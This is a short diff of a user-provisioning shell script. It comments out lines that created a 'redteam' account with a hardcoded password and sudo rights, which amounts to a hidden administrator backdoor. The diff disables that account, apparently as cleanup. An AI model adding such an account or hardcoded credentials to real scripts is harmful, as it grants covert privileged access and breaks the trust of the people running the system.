@@ -51,8 +51,8 @@ for admin in "${admins[@]}"; do
     echo "Admin $admin created and added to sudo group."
 done
 
-sudo useradd -m -s /bin/bash redteam
-    echo "redteam:letredin" | sudo chpasswd
-    sudo usermod -aG sudo redteam
+#sudo useradd -m -s /bin/bash redteam
+#echo "redteam:letredin" | sudo chpasswd
+#sudo usermod -aG sudo redteam
 
 echo "Users and admins have been created successfully."
